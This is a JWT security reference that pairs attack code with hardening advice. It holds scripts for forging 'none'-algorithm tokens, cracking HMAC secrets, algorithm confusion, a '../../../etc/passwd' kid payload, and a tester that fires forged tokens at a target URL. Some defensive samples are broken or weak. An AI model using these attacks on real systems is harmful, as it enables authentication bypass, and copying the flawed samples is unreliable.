# JWT Security

> JSON Web Tokens (JWT) are a compact, URL-safe means of representing claims to be transferred between two parties. While JWT provides a stateless authentication mechanism, improper implementation can lead to serious security vulnerabilities including authentication bypass, privilege escalation, and information disclosure.

## Summary

* [JWT Structure](#jwt-structure)
* [Common JWT Vulnerabilities](#common-jwt-vulnerabilities)
* [JWT Attacks](#jwt-attacks)
* [JWT Best Practices](#jwt-best-practices)
* [JWT Validation](#jwt-validation)
* [JWT in Modern Frameworks](#jwt-in-modern-frameworks)
* [JWT Testing Tools](#jwt-testing-tools)
* [JWT vs Session-based Auth](#jwt-vs-session-based-auth)
* [References](#references)

## JWT Structure

### JWT Format
A JWT consists of three parts separated by dots (`.`):
```
header.payload.signature
```

### 1. Header
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### 2. Payload (Claims)
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022,
  "exp": 1516242622
}
```

### 3. Signature
```python
# HMAC SHA256 signature
import hmac
import hashlib
import base64

def create_signature(header, payload, secret):
    """Create JWT signature"""
    message = f"{header}.{payload}"
    signature = hmac.new(
        secret.encode('utf-8'),
        message.encode('utf-8'),
        hashlib.sha256
    ).digest()
    return base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
```

## Common JWT Vulnerabilities

### 1. Algorithm Confusion Attack
```python
# Vulnerable code - accepts any algorithm
import jwt

def decode_jwt(token, secret):
    # Vulnerable - no algorithm verification
    return jwt.decode(token, secret, algorithms=["HS256", "RS256", "none"])

# Attack payload
# Header: {"alg": "none", "typ": "JWT"}
# Payload: {"admin": true, "sub": "attacker"}
```

### 2. Weak Secret Keys
```python
# Weak secret examples
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "jwt_secret",
    "your-256-bit-secret"
]

# Brute force attack
import jwt
import itertools

def brute_force_jwt(token, wordlist):
    """Attempt to brute force JWT secret"""
    for secret in wordlist:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            return secret, decoded
        except jwt.InvalidTokenError:
            continue
    return None, None
```

### 3. Missing Signature Verification
```python
# Vulnerable - accepts unsigned tokens
def unsafe_decode(token):
    # Dangerous - accepts tokens without signature
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    import base64
    import json
    
    payload = parts[1]
    # Add padding if needed
    padding = '=' * (4 - len(payload) % 4)
    decoded = base64.urlsafe_b64decode(payload + padding)
    return json.loads(decoded)
```

### 4. Expiration Not Checked
```python
# Vulnerable - doesn't check expiration
def decode_without_exp(token, secret):
    try:
        # Missing exp verification
        return jwt.decode(token, secret, options={"verify_exp": False})
    except jwt.InvalidTokenError:
        return None
```

## JWT Attacks

### 1. None Algorithm Attack
```python
# Create JWT with "none" algorithm
import base64
import json

def create_none_algorithm_jwt(payload):
    """Create JWT with none algorithm"""
    header = {"alg": "none", "typ": "JWT"}
    payload_json = json.dumps(payload)
    
    # Encode
    encoded_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    encoded_payload = base64.urlsafe_b64encode(
        payload_json.encode()
    ).decode().rstrip('=')
    
    # No signature for "none" algorithm
    signature = ""
    
    return f"{encoded_header}.{encoded_payload}.{signature}"

# Usage
malicious_jwt = create_none_algorithm_jwt({
    "sub": "admin",
    "admin": True
})
```

### 2. Secret Brute Force
```python
# JWT brute force script
import jwt
import requests

def crack_jwt_secret(token, wordlist_url):
    """Crack JWT secret using wordlist"""
    wordlist = requests.get(wordlist_url).text.splitlines()
    
    for secret in wordlist:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            return {
                "secret": secret,
                "decoded": decoded,
                "success": True
            }
        except jwt.InvalidTokenError:
            continue
    
    return {"success": False}

# Common JWT secrets
common_secrets = [
    "secret", "jwt_secret", "your-256-bit-secret", "password",
    "123456", "qwerty", "admin", "root", "token"
]
```

### 3. RSA to HMAC Confusion
```python
# Algorithm confusion attack
import jwt

def algorithm_confusion_attack(token, public_key):
    """Attempt RSA to HMAC confusion"""
    try:
        # Try to verify RSA-signed token with HMAC
        decoded = jwt.decode(token, public_key, algorithms=["HS256"])
        return decoded
    except jwt.InvalidTokenError:
        return None

# Attack scenario
# Original token signed with RSA private key
# Attack: Verify with RSA public key as HMAC secret
```

### 4. Kid Header Injection
```python
# Key ID (kid) injection
import jwt

def kid_injection_attack(token, jwks_url):
    """Exploit kid header for key confusion"""
    # 1. Get JWKS from jwks_url
    # 2. Find keys with kid matching
    # 3. Try each key for verification
    
    # Implementation depends on JWKS structure
    pass

# Malicious kid header
# {"alg": "HS256", "kid": "../../../etc/passwd", "typ": "JWT"}
```

## JWT Best Practices

### 1. Strong Secret Management
```python
import secrets
import os
from cryptography.fernet import Fernet

class JWTSecretManager:
    def __init__(self):
        self.secrets = {}
    
    def generate_strong_secret(self, key_id=None):
        """Generate cryptographically strong secret"""
        if key_id is None:
            key_id = secrets.token_urlsafe(16)
        
        # 256-bit secret for HS256
        secret = secrets.token_urlsafe(32)
        self.secrets[key_id] = secret
        
        return key_id, secret
    
    def rotate_secret(self, old_key_id):
        """Rotate JWT secret"""
        new_key_id, new_secret = self.generate_strong_secret()
        
        # Keep old secret for token validation during rotation
        self.secrets[f"{old_key_id}_old"] = self.secrets[old_key_id]
        self.secrets[new_key_id] = new_secret
        
        return new_key_id, new_secret
    
    def get_secret(self, key_id):
        """Get secret for key ID"""
        return self.secrets.get(key_id)

# Usage
secret_manager = JWTSecretManager()
key_id, secret = secret_manager.generate_strong_secret()
```

### 2. Proper Algorithm Selection
```python
import jwt
from cryptography.hazmat.primitives import serialization

class JWTManager:
    def __init__(self, algorithm='HS256'):
        self.algorithm = algorithm
        self.allowed_algorithms = ['HS256', 'RS256', 'ES256']
        
        if algorithm not in self.allowed_algorithms:
            raise ValueError(f"Unsupported algorithm: {algorithm}")
    
    def encode(self, payload, secret_or_private_key):
        """Encode JWT with proper algorithm"""
        return jwt.encode(
            payload,
            secret_or_private_key,
            algorithm=self.algorithm
        )
    
    def decode(self, token, secret_or_public_key):
        """Decode JWT with algorithm verification"""
        return jwt.decode(
            token,
            secret_or_public_key,
            algorithms=[self.algorithm]
        )

# RSA key pair generation
from cryptography.hazmat.primitives.asymmetric import rsa

def generate_rsa_keypair():
    """Generate RSA key pair for JWT"""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    public_key = private_key.public_key()
    
    # Serialize keys
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    return private_pem, public_pem
```

### 3. Claims Validation
```python
import time
from datetime import datetime, timedelta

class JWTValidator:
    def __init__(self, secret, algorithm='HS256'):
        self.secret = secret
        self.algorithm = algorithm
    
    def create_token(self, user_id, roles=None, expires_in=3600):
        """Create JWT with proper claims"""
        now = datetime.utcnow()
        payload = {
            'sub': str(user_id),
            'iat': now,
            'exp': now + timedelta(seconds=expires_in),
            'iss': 'your-app',
            'aud': 'your-app-users',
            'jti': secrets.token_urlsafe(16)
        }
        
        if roles:
            payload['roles'] = roles
        
        return jwt.encode(payload, self.secret, algorithm=self.algorithm)
    
    def validate_token(self, token):
        """Validate JWT with all security checks"""
        try:
            payload = jwt.decode(
                token,
                self.secret,
                algorithms=[self.algorithm],
                issuer='your-app',
                audience='your-app-users'
            )
            
            # Additional custom validation
            self._validate_custom_claims(payload)
            
            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token has expired")
        except jwt.InvalidTokenError as e:
            raise ValueError(f"Invalid token: {str(e)}")
    
    def _validate_custom_claims(self, payload):
        """Custom claim validation"""
        # Check for required claims
        required_claims = ['sub', 'exp', 'iat']
        for claim in required_claims:
            if claim not in payload:
                raise ValueError(f"Missing required claim: {claim}")
        
        # Validate roles
        if 'roles' in payload:
            valid_roles = ['user', 'admin', 'moderator']
            for role in payload['roles']:
                if role not in valid_roles:
                    raise ValueError(f"Invalid role: {role}")
```

### 4. Token Blacklisting
```python
import redis
import time

class JWTBlacklist:
    def __init__(self, redis_client=None):
        self.redis = redis_client or redis.Redis()
    
    def blacklist_token(self, token, expires_in=None):
        """Add token to blacklist"""
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            jti = payload.get('jti')
            exp = payload.get('exp')
            
            if jti and exp:
                ttl = exp - int(time.time())
                if ttl > 0:
                    self.redis.setex(f"blacklist:{jti}", ttl, "1")
                    return True
        except:
            pass
        return False
    
    def is_blacklisted(self, token):
        """Check if token is blacklisted"""
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            jti = payload.get('jti')
            
            if jti:
                return self.redis.exists(f"blacklist:{jti}")
        except:
            pass
        return False
    
    def cleanup_expired(self):
        """Clean up expired blacklist entries"""
        # Redis handles expiration automatically with setex
        pass
```

## JWT Validation

### 1. Comprehensive Validation
```python
import jwt
from datetime import datetime

class SecureJWTValidator:
    def __init__(self, secret, algorithm='HS256'):
        self.secret = secret
        self.algorithm = algorithm
    
    def validate(self, token):
        """Comprehensive JWT validation"""
        validation_result = {
            'valid': False,
            'payload': None,
            'errors': []
        }
        
        try:
            # Decode without verification first to get header
            unverified = jwt.decode(token, options={"verify_signature": False})
            header = jwt.get_unverified_header(token)
            
            # Validate algorithm
            if header.get('alg') != self.algorithm:
                validation_result['errors'].append("Invalid algorithm")
                return validation_result
            
            # Full validation
            payload = jwt.decode(
                token,
                self.secret,
                algorithms=[self.algorithm],
                options={
                    "verify_signature": True,
                    "verify_exp": True,
                    "verify_iat": True,
                    "verify_nbf": True
                }
            )
            
            # Additional checks
            self._perform_additional_checks(payload, validation_result)
            
            validation_result['valid'] = True
            validation_result['payload'] = payload
            
        except jwt.ExpiredSignatureError:
            validation_result['errors'].append("Token expired")
        except jwt.InvalidTokenError as e:
            validation_result['errors'].append(str(e))
        
        return validation_result
    
    def _perform_additional_checks(self, payload, result):
        """Additional security checks"""
        # Check token age
        if 'iat' in payload:
            issued_at = datetime.fromtimestamp(payload['iat'])
            if (datetime.utcnow() - issued_at).total_seconds() > 86400:
                result['errors'].append("Token too old")
        
        # Check for suspicious claims
        suspicious_claims = ['admin', 'root', 'sudo']
        for claim in suspicious_claims:
            if payload.get(claim) is True:
                result['errors'].append(f"Suspicious claim: {claim}")
```

### 2. JWKS (JSON Web Key Set) Support
```python
import json
from cryptography.hazmat.primitives import serialization

class JWKSManager:
    def __init__(self, jwks_file):
        with open(jwks_file, 'r') as f:
            self.jwks = json.load(f)
    
    def get_key(self, kid):
        """Get key by key ID"""
        for key in self.jwks.get('keys', []):
            if key.get('kid') == kid:
                return key
        return None
    
    def validate_with_jwks(self, token):
        """Validate JWT using JWKS"""
        try:
            header = jwt.get_unverified_header(token)
            kid = header.get('kid')
            
            if not kid:
                raise ValueError("Missing key ID")
            
            key_data = self.get_key(kid)
            if not key_data:
                raise ValueError("Key not found")
            
            # Convert JWK to public key
            from cryptography.hazmat.primitives.asymmetric import rsa
            # Implementation depends on key type
            
            return jwt.decode(token, key, algorithms=[header['alg']])
            
        except Exception as e:
            raise ValueError(f"JWKS validation failed: {str(e)}")
```

## JWT in Modern Frameworks

### 1. Django REST Framework
```python
# settings.py
JWT_AUTH = {
    'JWT_SECRET_KEY': SECRET_KEY,
    'JWT_ALGORITHM': 'HS256',
    'JWT_EXPIRATION_DELTA': timedelta(days=7),
    'JWT_ALLOW_REFRESH': True,
    'JWT_REFRESH_EXPIRATION_DELTA': timedelta(days=30),
    'JWT_AUTH_HEADER_PREFIX': 'Bearer',
}

# Views
from rest_framework_simplejwt.tokens import RefreshToken

class LoginView(APIView):
    def post(self, request):
        username = request.data.get('username')
        password = request.data.get('password')
        
        user = authenticate(username=username, password=password)
        if user:
            refresh = RefreshToken.for_user(user)
            return Response({
                'refresh': str(refresh),
                'access': str(refresh.access_token),
            })
        
        return Response({'error': 'Invalid credentials'}, status=401)
```

### 2. Flask-JWT-Extended
```python
from flask import Flask
from flask_jwt_extended import JWTManager, create_access_token, jwt_required

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = 'your-secret-key'
app.config['JWT_ALGORITHM'] = 'HS256'
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=1)

jwt = JWTManager(app)

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    if authenticate(username, password):
        access_token = create_access_token(identity=username)
        return jsonify(access_token=access_token)
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/protected', methods=['GET'])
@jwt_required()
def protected():
    return jsonify({'message': 'Access granted'})
```

### 3. Express.js (Node.js)
```javascript
const jwt = require('jsonwebtoken');

// Token creation
function createToken(user) {
    const payload = {
        sub: user.id,
        username: user.username,
        roles: user.roles,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour
    };
    
    return jwt.sign(payload, process.env.JWT_SECRET, { algorithm: 'HS256' });
}

// Token validation middleware
function validateToken(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET, {
            algorithms: ['HS256']
        });
        
        req.user = decoded;
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Invalid token' });
    }
}
```

### 4. Spring Security
```java
@Component
public class JwtTokenProvider {
    
    @Value("${jwt.secret}")
    private String jwtSecret;
    
    @Value("${jwt.expiration}")
    private int jwtExpiration;
    
    public String generateToken(User user) {
        Date expiryDate = new Date(System.currentTimeMillis() + jwtExpiration);
        
        return Jwts.builder()
            .setSubject(user.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(expiryDate)
            .signWith(SignatureAlgorithm.HS512, jwtSecret)
            .compact();
    }
    
    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .setSigningKey(jwtSecret)
                .parseClaimsJws(token);
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            return false;
        }
    }
}
```

## JWT Testing Tools

### 1. Manual Testing
```bash
# JWT.io debugger
# Online JWT debugger at jwt.io

# Command line tools
npm install -g jwt-cracker
pip install pyjwt

# Testing commands
jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

### 2. Automated Tools
```python
# Python JWT testing
import jwt
import requests

class JWTTester:
    def __init__(self, target_url):
        self.target_url = target_url
    
    def test_none_algorithm(self, token):
        """Test none algorithm attack"""
        # Create token with none algorithm
        payload = jwt.decode(token, options={"verify_signature": False})
        malicious_token = jwt.encode(payload, "", algorithm="none")
        
        # Test with target
        response = requests.get(
            self.target_url,
            headers={"Authorization": f"Bearer {malicious_token}"}
        )
        
        return response.status_code == 200
    
    def test_secret_bruteforce(self, token, wordlist):
        """Test secret brute force"""
        for secret in wordlist:
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                return secret, decoded
            except:
                continue
        return None, None
    
    def test_algorithm_confusion(self, token, public_key):
        """Test algorithm confusion"""
        try:
            decoded = jwt.decode(token, public_key, algorithms=["HS256"])
            return decoded
        except:
            return None
```

### 3. Burp Suite Extensions
```python
# JWT Editor extension for Burp Suite
# JWT Scanner extension
# JWT Intruder payloads
```

## JWT vs Session-based Auth

### Comparison Table
| Aspect | JWT | Session |
|--------|-----|---------|
| **State** | Stateless | Stateful |
| **Storage** | Client-side | Server-side |
| **Scalability** | High | Medium |
| **Revocation** | Difficult | Easy |
| **Size** | Larger | Smaller |
| **Security** | Medium | High |

### When to Use JWT
- **Microservices**: Stateless authentication between services
- **Mobile Apps**: Offline capability
- **Third-party Integrations**: API authentication
- **Single Sign-On**: Cross-domain authentication

### When to Use Sessions
- **Traditional Web Apps**: Server-side control
- **High Security**: Easy revocation
- **Complex Permissions**: Server-side validation
- **Compliance**: Audit requirements

## References

* [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
* [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
* [JWT.io Debugger](https://jwt.io/)
* [JWT Security Best Practices](https://auth0.com/docs/secure/tokens/json-web-tokens)
* [JWT Attacks](https://portswigger.net/web-security/jwt)
